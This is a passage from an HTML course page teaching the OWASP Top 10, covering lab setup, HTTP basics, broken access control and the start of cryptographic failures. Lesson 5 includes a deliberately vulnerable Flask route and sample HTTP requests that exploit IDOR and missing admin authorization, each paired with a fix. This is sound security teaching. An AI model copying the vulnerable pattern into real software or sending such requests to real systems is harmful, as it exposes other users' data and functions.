


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css"
    />
    <link rel="stylesheet" href="assets/css/coursepages.css">
    
    <!-- ========== Start: SEO & Schema Enhancement ========== -->
    <title>OWASP Top 10 - Complete Course | CipherHall</title>
    <meta name="description" content="Enroll in our expert-led OWASP Top 10 masterclass. Learn to exploit and defend against critical web application security risks through hands-on labs.">
    
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />
    <link rel="canonical" href="https://www.cipherhall.com/courses/owasp-top-10-web-app-security.html" />

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "OWASP Top 10 Web Application Security - Complete Course",
      "description": "A comprehensive, 50-lesson masterclass in web application security, using the OWASP Top 10 as a framework for deep-diving into the most critical risks with hands-on labs, real-world code, and advanced exploitation techniques.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Dr. Eleanor Vance"
        }
      }
    }
    </script>
    <!-- ========== End: SEO & Schema Enhancement ========== -->
</head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CipherHall</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CipherHall</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard.html" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================
      const COURSE_DATA = {
        "id": "owasp-top-10",
        "title": "OWASP Top 10 Web Application Security",
        "description": "A comprehensive, 50-lesson masterclass in web application security, using the OWASP Top 10 as a framework for deep-diving into the most critical risks with hands-on labs, real-world code, and advanced exploitation techniques.",
        "category": "application-security",
        "difficulty": "Beginner to Advanced",
        "duration": "100 hours",
        "instructor": "Dr. Eleanor Vance",
        "lessons": [
            {
                "id": "lesson-1-owasp-intro",
                "title": "Lesson 1: OWASP Introduction and Web Security Basics",
                "duration": "120 min",
                "objectives": [
                    "Understand the mission and resources of the OWASP Foundation",
                    "Grasp the critical business impact of web application security vulnerabilities",
                    "Differentiate between black-box, white-box, and gray-box security testing methodologies",
                    "Identify common web attack vectors and their potential consequences"
                ],
                "content": {
                    "overview": "Welcome to the front lines of digital defense. This foundational lesson introduces the Open Web Application Security Project (OWASP) and the critical importance of web application security in today's threat landscape. We'll explore why insecure applications are the #1 attack vector and lay the groundwork for the testing methodologies you will use throughout this course.",
                    "sections": [
                        {
                            "title": "The OWASP Foundation: Your Security North Star",
                            "content": "<p>The Open Web Application Security Project (OWASP) is a non-profit, open-source community dedicated to improving the security of software. It is not a software company or a regulatory body. It is a global community of security professionals, developers, and hobbyists who produce freely-available articles, methodologies, documentation, tools, and technologies.</p><h3>Why OWASP Matters:</h3><ul><li><strong>Vendor-Neutral:</strong> OWASP provides unbiased, practical information that is not tied to any specific commercial product.</li><li><strong>Community-Driven:</strong> Its resources, like the OWASP Top 10, are created through the consensus of thousands of experts based on real-world data about the most common and impactful attacks.</li><li><strong>Comprehensive Resources:</strong> Beyond the Top 10, OWASP produces the Application Security Verification Standard (ASVS), the Proactive Controls, and dozens of open-source tools like the Zed Attack Proxy (ZAP).</li></ul>",
                            "image": "https://images.unsplash.com/photo-1526374965328-7f61d4e18c66?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Security Testing Methodologies",
                            "content": "<p>How you test an application depends on the amount of information you have about its inner workings. This is broken down into three main approaches.</p><ul><li><strong>Black-Box Testing:</strong> The tester has zero knowledge of the internal system. They approach the application just like an external attacker would, with no source code or architecture diagrams. This simulates an external attack.</li><li><strong>White-Box Testing:</strong> The tester has complete access to all information, including source code, design documents, and infrastructure details. This allows for the most thorough analysis, such as a manual code review, to find flaws that would be invisible from the outside.</li><li><strong>Gray-Box Testing:</strong> A hybrid approach. The tester has some limited knowledge, such as user-level credentials or some information about the application's architecture. This can simulate an insider threat or an attack where the adversary has already gained a foothold.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the OWASP Foundation?", "options": ["A company that sells firewalls", "A government agency that regulates web security", "A non-profit, open-source community dedicated to improving software security", "A type of web server"], "correct": 2, "explanation": "OWASP's strength comes from its vendor-neutral, community-driven approach to producing free and open security resources." },
                        { "id": 2, "question": "A penetration tester is given only a URL to an application and no other information. What type of testing are they conducting?", "options": ["White-Box", "Gray-Box", "Black-Box", "Unit Testing"], "correct": 2, "explanation": "Black-box testing simulates a real-world external attacker who has no prior inside knowledge of the system." }
                    ]
                }
            },
            {
                "id": "lesson-2-testing-environment-setup",
                "title": "Lesson 2: Security Testing Environment Setup",
                "duration": "180 min",
                "objectives": [
                    "Deploy deliberately vulnerable web applications like DVWA and WebGoat using Docker",
                    "Install and configure essential penetration testing tools like Burp Suite and OWASP ZAP",
                    "Configure a web browser to proxy traffic through your testing tools",
                    "Understand the importance of an isolated and ethical testing environment"
                ],
                "content": {
                    "overview": "You cannot learn to hack without a safe and legal environment to practice in. This hands-on lesson guides you through the complete setup of a professional security testing lab. You will deploy deliberately vulnerable web applications and configure the interception proxy tools used by security professionals worldwide.",
                    "sections": [
                        {
                            "title": "Deploying Vulnerable Applications with Docker",
                            "content": "<p>The best way to learn is by practicing on applications that are *designed* to be vulnerable. Docker makes this incredibly easy and safe.</p><h3>Damn Vulnerable Web Application (DVWA):</h3><p>DVWA is a classic PHP/MySQL web application that is packed with common vulnerabilities. It also has different security levels, allowing you to see how different coding practices affect the outcome of an attack.</p><h3>OWASP WebGoat:</h3><p>WebGoat is another popular vulnerable application, but based on Java (specifically Spring Boot). It provides a more modern technology stack and covers a wide range of vulnerabilities, with detailed lessons built into the application itself.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Warning</strong></div><p>These applications are deliberately vulnerable. Never expose them to the internet or run them in an untrusted environment. Only run them on your local machine.</p></div>",
                            "image": "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Configuring an Interception Proxy",
                            "content": "<p>An interception proxy is the single most important tool for a web application penetration tester. It is a piece of software that runs on your local machine and sits between your web browser and the internet. It allows you to intercept, inspect, and even modify every single HTTP request and response in real time.</p><h3>Key Tools:</h3><ul><li><strong>Burp Suite (Community or Professional):</strong> The industry standard for professional penetration testers.</li><li><strong>OWASP Zed Attack Proxy (ZAP):</strong> A powerful, free, and open-source alternative from OWASP.</li></ul><p>The setup involves configuring your browser (often using an extension like FoxyProxy) to route all its traffic through the proxy tool, which typically listens on a local port like `127.0.0.1:8080`. You also need to install the proxy's CA certificate in your browser's trust store to allow it to intercept and decrypt HTTPS traffic.</p>",
                            "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Deploying DVWA with Docker Compose",
                        "language": "yaml",
                        "code": "# docker-compose.yml for DVWA\n# Save this as 'docker-compose.yml' and run 'docker-compose up -d' in the same directory.\nversion: '3'\nservices:\n  dvwa:\n    image: vulnerables/web-dvwa\n    ports:\n      - \"80:80\" # Maps port 80 on your host to port 80 in the container"
                    },
                    {
                        "title": "Deploying WebGoat with Docker",
                        "language": "bash",
                        "code": "# A simple command to run WebGoat on port 8080.\ndocker run -p 8080:8080 -d webgoat/webgoat-8.0"
                    },
                    {
                        "title": "Configuring Browser Proxy with FoxyProxy",
                        "language": "markdown",
                        "code": "## FoxyProxy Configuration for Burp Suite ##\n\n1. Install the FoxyProxy extension in your browser (e.g., Firefox).\n2. Open FoxyProxy options and click 'Add'.\n3. **Title:** Burp Suite\n4. **Proxy Type:** HTTP\n5. **Proxy IP address:** 127.0.0.1\n6. **Port:** 8080\n7. Save. Now you can easily switch your browser's proxy settings on and off by clicking the FoxyProxy icon."
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary function of an interception proxy like Burp Suite or OWASP ZAP?", "options": ["To act as a web server", "To sit between your browser and the target application, allowing you to inspect and modify all HTTP/S traffic", "To scan for viruses on your computer", "To write code"], "correct": 1, "explanation": "This interception capability is the core of web application security testing, giving the tester complete control over the communication between the client and the server." },
                        { "id": 2, "question": "Why is it essential to install the proxy's CA certificate into your browser's trust store?", "options": ["To make your internet connection faster", "To allow the proxy to decrypt and inspect HTTPS traffic without causing browser certificate errors", "To get a free license for the software", "To block all internet access"], "correct": 1, "explanation": "This step enables the proxy to perform a 'man-in-the-middle' on your own traffic, which is necessary to analyze the contents of secure, encrypted HTTPS sessions." },
                        { "id": 3, "question": "The primary reason for using a deliberately vulnerable application like DVWA is:", "options": ["To host a production website", "To have a safe and legal environment to practice identifying and exploiting web vulnerabilities", "To test your firewall's effectiveness", "To learn how to use Docker"], "correct": 1, "explanation": "Practicing on these platforms is the standard way to build hands-on penetration testing skills without breaking the law or causing damage." }
                    ]
                }
            },
            {
                "id": "lesson-3-http-protocol-security",
                "title": "Lesson 3: HTTP Protocol Security",
                "duration": "120 min",
                "objectives": [
                    "Deconstruct the structure of HTTP requests and responses",
                    "Analyze the role of HTTP headers in security",
                    "Understand how cookies and session tokens are used to maintain state",
                    "Recognize the importance of using HTTPS to protect data in transit"
                ],
                "content": {
                    "overview": "To secure a web application, you must first understand the language it speaks. This lesson breaks down the Hypertext Transfer Protocol (HTTP), the fundamental protocol of the web. We will examine the structure of requests and responses and the role of key components like headers and cookies in both functionality and security.",
                    "sections": [
                        {
                            "title": "Request and Response Structure",
                            "content": "<p>All web communication is a series of requests from a client (your browser) and responses from a server.</p><h3>HTTP Request:</h3><ul><li><strong>Request Line:</strong> Contains the HTTP method (`GET`, `POST`), the requested resource (`/index.html`), and the HTTP version (`HTTP/1.1`).</li><li><strong>Headers:</strong> Key-value pairs that provide metadata about the request (e.g., `Host`, `User-Agent`, `Accept`).</li><li><strong>Body (Optional):</strong> The data being sent to the server, typically with a `POST` request (e.g., a login form).</li></ul><h3>HTTP Response:</h3><ul><li><strong>Status Line:</strong> Contains the HTTP version, a status code (`200 OK`, `404 Not Found`), and a status message.</li><li><strong>Headers:</strong> Key-value pairs that provide metadata about the response (e.g., `Content-Type`, `Content-Length`, `Set-Cookie`).</li><li><strong>Body:</strong> The content of the response, such as the HTML of a webpage.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Session Management and Cookies",
                            "content": "<p>HTTP is a stateless protocol. This means each request is independent. To create a stateful 'session' (like keeping you logged in), web applications use session tokens, most commonly stored in cookies.</p><h3>The Cookie Workflow:</h3><ol><li>You log in to a website by sending your username and password.</li><li>If they are correct, the server generates a unique, random session ID token.</li><li>The server sends this token back to your browser in a `Set-Cookie` response header.</li><li>Your browser automatically stores this cookie.</li><li>For every subsequent request to that same website, your browser will automatically include the session token cookie in a `Cookie` request header.</li><li>The server sees this token, looks it up in its session database, identifies you, and responds with the correct data.</li></ol><p>These session cookies are a primary target for attackers. If an attacker can steal your session cookie, they can impersonate you without needing your password.</p>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Example GET Request (raw)",
                        "language": "http",
                        "code": "GET /users/123 HTTP/1.1\nHost: api.example.com\nUser-Agent: curl/7.64.1\nAccept: */*\nConnection: keep-alive"
                    },
                    {
                        "title": "Example POST Request with Body (raw)",
                        "language": "http",
                        "code": "POST /login HTTP/1.1\nHost: myapp.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 27\n\nusername=test&password=p%40ss"
                    },
                    {
                        "title": "Example Response Setting a Cookie (raw)",
                        "language": "http",
                        "code": "HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1234\nSet-Cookie: sessionID=abc123xyz789; HttpOnly; Secure; SameSite=Strict\n\n<!DOCTYPE html>..."
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "In an HTTP request, which method is typically used to send data (like a completed form) to the server?", "options": ["GET", "HEAD", "POST", "OPTIONS"], "correct": 2, "explanation": "The POST method is used to submit an entity to the specified resource, often causing a change in state or side effects on the server. The data is included in the request body." },
                        { "id": 2, "question": "How do web applications maintain a user's logged-in state across multiple stateless HTTP requests?", "options": ["By asking the user to re-enter their password on every page", "By using a session token, typically stored in a cookie", "By storing the user's IP address", "By using only the GET method"], "correct": 1, "explanation": "Session cookies are the standard mechanism for creating a stateful session on top of the stateless HTTP protocol." },
                        { "id": 3, "question": "In which HTTP response header does a server instruct a browser to store a cookie?", "options": ["Content-Type", "Server", "Cookie", "Set-Cookie"], "correct": 3, "explanation": "The `Set-Cookie` header is the specific directive used by the server to send a cookie to the client, which the client then stores for future requests." }
                    ]
                }
            },
            {
                "id": "lesson-4-web-app-architecture",
                "title": "Lesson 4: Web Application Architecture Security",
                "duration": "120 min",
                "objectives": [
                    "Identify key components in a modern web application architecture (client, server, database)",
                    "Recognize common security trust boundaries between components",
                    "Understand the basic security model for APIs",
                    "Evaluate the security considerations of different web frameworks"
                ],
                "content": {
                    "overview": "To effectively find vulnerabilities, you must understand the system you are attacking. This lesson provides a high-level overview of a typical web application's architecture, identifying the different components and, more importantly, the trust boundaries between them where vulnerabilities often arise.",
                    "sections": [
                        {
                            "title": "The Three-Tier Architecture",
                            "content": "<p>A classic web application is broken down into three logical tiers.</p><h3>The Tiers:</h3><ul><li><strong>Presentation Tier (Client-Side):</strong> This is what runs in the user's browser. It is composed of HTML, CSS, and JavaScript. All code in this tier is under the control of the user and cannot be trusted. An attacker can view and manipulate all JavaScript code.</li><li><strong>Logic Tier (Server-Side):</strong> This is the backend application that runs on the server (e.g., written in Java, Python, C#, Node.js). It receives requests from the client, performs business logic, and interacts with the database. This is where most security controls (like authentication and authorization) must be enforced.</li><li><strong>Data Tier (Database):</strong> This is where the application's data is stored, typically in a relational (SQL) or NoSQL database. This is the most trusted and protected tier.</li></ul><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Never Trust the Client</strong></div><p>This is the golden rule of web security. All input from the client (URLs, form fields, headers, cookies) is untrusted and must be rigorously validated and sanitized on the server before it is used. Any security check performed only on the client-side (e.g., in JavaScript) can be trivially bypassed.</p></div>",
                            "image": "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "API Security Basics",
                            "content": "<p>Modern applications, especially Single Page Applications (SPAs) and mobile apps, are heavily reliant on Application Programming Interfaces (APIs). The client-side application is just a 'shell' that makes API calls to a backend server to get its data.</p><h3>Key Security Implications:</h3><ul><li><strong>The API is the new perimeter:</strong> Your backend APIs are now directly exposed and become the primary attack surface.</li><li><strong>Authentication and Authorization are paramount:</strong> Every single API endpoint must be protected. It must check for a valid authentication token and then check if that authenticated user is *authorized* to perform the requested action on the requested data.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1596003906915-013661138ae2?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the golden rule of web application security?", "options": ["Always trust user input", "Client-side validation is sufficient", "Never trust the client; all input must be validated on the server", "JavaScript cannot be modified by the user"], "correct": 2, "explanation": "An attacker has full control over the client (their own browser) and can manipulate any data sent from it. Therefore, all security-critical decisions and validation must happen on the server, which is the only component you can trust." },
                        { "id": 2, "question": "In a three-tier architecture, where must business logic and authorization checks be enforced?", "options": ["In the Presentation Tier (Client-Side JavaScript)", "In the Logic Tier (Server-Side Code)", "In the Data Tier (Database)", "In the user's browser"], "correct": 1, "explanation": "The server-side logic tier is the trusted component responsible for enforcing the rules of the application. Placing authorization checks anywhere else can lead to bypasses." }
                    ]
                }
            },
            {
                "id": "lesson-5-a01-broken-access-control",
                "title": "Lesson 5: A01 - Broken Access Control",
                "duration": "150 min",
                "objectives": [
                    "Identify and exploit vertical and horizontal privilege escalation",
                    "Detect and abuse Insecure Direct Object References (IDORs)",
                    "Find and bypass missing function-level access control vulnerabilities",
                    "Understand how CORS misconfigurations can lead to data exposure"
                ],
                "content": {
                    "overview": "Moving to #1 in the 2021 OWASP Top 10, Broken Access Control is a massive category of vulnerabilities. It occurs when a user is able to act outside of their intended permissions. This lesson covers the most common and critical forms of this vulnerability, such as accessing other users' data or calling administrative functions.",
                    "sections": [
                        {
                            "title": "Vertical vs. Horizontal Privilege Escalation",
                            "content": "<p>Access control issues can be divided into two main categories.</p><ul><li><strong>Vertical Privilege Escalation:</strong> A lower-privileged user is able to access functionality reserved for a higher-privileged user. *Classic Example:* A regular user is able to access the `/admin` page by simply browsing to the URL because the server doesn't check if they are an administrator.</li><li><strong>Horizontal Privilege Escalation:</strong> A user is able to access data or resources belonging to another user who has the same level of privilege. *Classic Example:* User A is logged in and views their own profile at `/profile?id=123`. They change the URL to `/profile?id=456` and are able to see User B's profile. This is also known as an Insecure Direct Object Reference (IDOR).</li></ul>",
                            "image": "https://images.unsplash.com/photo-1516321497487-e288fb19713f?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Insecure Direct Object References (IDOR)",
                            "content": "<p>IDOR is the most common form of broken access control. It occurs when the application uses a user-supplied identifier to reference an internal object (like a database record) without first verifying that the current user is *authorized* to access that object.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>The Root Cause</strong></div><p>The root cause of IDOR is the failure to perform an authorization check. The developer correctly checks that the user is *authenticated* (logged in), but they fail to check if that logged-in user is *authorized* to access the specific object ID they requested in the URL.</p></div>",
                            "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Missing Function Level Access Control",
                            "content": "<p>This is the classic case of vertical privilege escalation. A common pattern is that the user interface (UI) will hide or not display a button for an administrative function for a regular user. However, if the user knows the URL of that administrative API endpoint, they can call it directly. The backend server code fails to repeat the authorization check, trusting that if the request was made, the user must have had the button to click. This is a violation of the 'never trust the client' principle.</p>",
                            "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Vulnerable Code for IDOR (Python/Flask)",
                        "language": "python",
                        "code": "# The code correctly checks that the user is logged in (`@login_required`).\n# However, it blindly trusts the `order_id` from the URL.\n# It never checks if the logged-in user actually owns that order.\n\n@app.route('/orders/<int:order_id>')\n@login_required\ndef get_order(order_id):\n    order = db.get_order_by_id(order_id)\n    return render_template('order_details.html', order=order)"
                    },
                    {
                        "title": "IDOR Exploitation (HTTP Request)",
                        "language": "http",
                        "code": "# Attacker Bob is logged in (has a valid session cookie).\n# He requests his own order and sees the URL structure.\nGET /orders/101 HTTP/1.1\nHost: e-commerce.com\nCookie: sessionID=bob_session_token\n\n# Attacker Bob now simply changes the ID in the URL, hoping to see another user's order.\nGET /orders/102 HTTP/1.1\nHost: e-commerce.com\nCookie: sessionID=bob_session_token"
                    },
                    {
                        "title": "Secure Code for IDOR (Python/Flask)",
                        "language": "python",
                        "code": "# Secure version: It gets the current user's ID from the trusted session.\n# It then explicitly checks if the order belongs to that user before returning it.\n\n@app.route('/orders/<int:order_id>')\n@login_required\ndef get_order(order_id):\n    order = db.get_order_by_id(order_id)\n    \n    # The critical authorization check!\n    if order.owner_id != session['user_id']:\n        abort(403) # Forbidden\n        \n    return render_template('order_details.html', order=order)"
                    },
                    {
                        "title": "Missing Function-Level Access Exploit (HTTP Request)",
                        "language": "http",
                        "code": "# An attacker logged in as a normal user sees that admin functionality exists from the site's JavaScript files.\n# They try to call the administrative API endpoint directly.\n# The server fails to check if the user is an admin and processes the request.\n\nPOST /api/v1/users/delete HTTP/1.1\nHost: someapp.com\nCookie: sessionID=normal_user_token\nContent-Type: application/json\n\n{\"userIdToDelete\": 456}"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A user logged in as 'user1' is able to view the private profile page of 'user2' by changing the ID in the URL. This is an example of what?", "options": ["SQL Injection", "Horizontal Privilege Escalation (IDOR)", "Vertical Privilege Escalation", "Cross-Site Scripting"], "correct": 1, "explanation": "This is a horizontal privilege escalation because the attacker is moving 'sideways' to access the data of another user at the same privilege level. It's the classic Insecure Direct Object Reference (IDOR) pattern." },
                        { "id": 2, "question": "What is the root cause of most broken access control vulnerabilities?", "options": ["Poor encryption", "A slow database", "Failure to perform an authorization check on the server-side", "Not having a firewall"], "correct": 2, "explanation": "The vulnerability occurs when the server blindly trusts that the client-side UI has already enforced the necessary access controls, and it fails to repeat those critical authorization checks before performing an action." },
                        { "id": 3, "question": "A regular user is able to successfully call an administrative API endpoint (e.g., `/api/deleteUser`) by simply guessing the URL. This is an example of what?", "options": ["Missing Function-Level Access Control", "Cross-Site Request Forgery", "Horizontal Privilege Escalation", "Insecure Deserialization"], "correct": 0, "explanation": "This is a form of vertical privilege escalation. The developer hid the button in the UI but failed to secure the backend API function itself." }
                    ]
                }
            },
            {
                "id": "lesson-6-a02-cryptographic-failures",
                "title": "Lesson 6: A02 - Cryptographic Failures",
                "duration": "120 min",
                "objectives": [
                    "Identify the use of weak or deprecated cryptographic algorithms",
                    "Recognize failures in key management, such as hard-coded keys",
                    "Understand the importance of encrypting all sensitive data in transit",
                    "Detect the transmission of sensitive data in cleartext"
                ],
                "content": {
                    "overview": "Formerly known as 'Sensitive Data Exposure,' this category focuses on failures related to cryptography. This lesson covers common mistakes developers make when implementing encryption, from using weak algorithms to poor key management, that can lead to the complete compromise of sensitive data.",
                    "sections": [
                        {
                            "title": "Weak Encryption Implementation",
                            "content": "<p>Using cryptography correctly is hard. Developers often make critical mistakes.</p><h3>Common Failures:</h3><ul><li><strong>Weak or Deprecated Algorithms:</strong> Using old, broken algorithms like MD5 or SHA1 for hashing passwords, or using outdated block ciphers like DES.</li><li><strong>Use of Non-Random Keys/IVs:</strong> Using a predictable key or Initialization Vector (IV) can make an otherwise strong algorithm trivial to break.</li><li><strong>Data in Transit Not Encrypted:</strong> Transmitting sensitive data over plain HTTP instead of HTTPS. A login form that submits over HTTP exposes the user's password to anyone on the network.</li><li><strong>Unsalted Hashes:</strong> Hashing passwords without a unique, random 'salt' for each user. This makes them vulnerable to 'rainbow table' attacks, where an attacker can pre-calculate the hashes of common passwords.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1599373922312-5b9340d8a5a5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Key Management Failures",
